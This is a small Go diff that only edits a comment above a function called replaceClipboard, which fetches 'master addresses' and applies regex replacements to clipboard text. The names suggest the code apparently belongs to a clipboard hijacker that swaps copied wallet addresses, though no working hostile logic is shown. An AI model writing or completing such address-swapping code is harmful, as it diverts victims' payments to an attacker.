@@ -34,7 +34,7 @@ func main() {
 }
 
 // Go through all regex matches, compile regex for them,
-// if match string replace all
+// if match, return updated clipboardStr
 func replaceClipboard(clipboardStr string) (string, error) {
 	masterAddresses, err := getMasterAddresses()
 
